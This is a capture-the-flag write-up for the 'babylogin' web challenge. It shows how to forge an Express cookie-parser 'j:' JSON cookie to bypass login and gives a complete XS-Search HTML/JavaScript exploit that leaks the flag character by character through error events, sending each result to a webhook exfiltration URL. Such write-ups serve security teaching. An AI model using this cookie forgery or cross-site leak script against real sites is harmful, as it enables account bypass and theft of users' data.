# babylogin

## TLDR;

1. Bypass login by modifying the cookie to a json cookie that will create "allowed" property for `auth`

Example: `j:{"id":"id_here","username":"a","password":"a","allowed":true}`

2. Abuse a simple xs-search by detecting http errors https://xsleaks.dev/docs/attacks/error-events/ and exfiltrate the flag char by char

## Login bypass

For this challenge, we needed to pollute or add a property named `allowed` by modifying the cookie, this is possible since cookieparser by default has these special type of cookies called JSONCookies

Let's check the cookie-parser source

```js
// https://github.com/expressjs/cookie-parser/blob/master/index.js
/**
 * Parse JSON cookie string.
 *
 * @param {String} str
 * @return {Object} Parsed object or undefined if not json cookie
 * @public
 */

function JSONCookie (str) {
  if (typeof str !== 'string' || str.substr(0, 2) !== 'j:') {
    return undefined
  }

  try {
    return JSON.parse(str.slice(2))
  } catch (err) {
    return undefined
  }
}
```

So this basically means instead of having a normal stringified cookie, we can simple add `j:` in the begining which would lead cookie-parser to treat it as an object via `JSON.parse`, therefore we can add a new property to the obj `auth` in the `checkCookie` function.

## XS-Search

After bypassing the login, we notice the search functionality is accessible by the admin bot only as well as that there are no SOP(same origin policy) protections in place therefore we can immediatly realize this is a simple XS Search vulnerability.

For this attack to work, we need to find a status change that makes it easy to detect correct characters, in our case the website makes it easier by applying HTTP Status codes to the search functionality:

```
Success: user found => 200 OK
Fail: user not found => 404 Not found 
```

We can now start building our script by using this simple status code error detection from https://xsleaks.dev/docs/attacks/error-events/

```html
</html>
<body>
    <script> 
        var flag = "cr3{"
        const exfil_url = "https://webhook.url"
        const probeError = (url, char) => {
            let s = document.createElement('script');
            s.src = url;
            s.onload = () => {
                flag += char
                fetch(exfil_url+"?flag="+encodeURIComponent(flag))
                s.remove()
            };
            document.head.appendChild(s);
            
        };
        
        // loop leak function to add chars 
        setInterval(()=>{
            for (let c of  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}") {
                probeError("http://localhost:3000/search?username="+encodeURIComponent(flag + c),c);    
            }
        },2500)
        
    </script>
</body>
</html>
```

Notes:
- To make the search easier, I've included the alphabet needed to check for correct chars in the description. 
- You can also notice the bot has a wait timeout for 40 seconds, which should be enough to exfil the first part of the flag, and you can simply modify the script with the portion of the flag you got and resubmit to the bot. 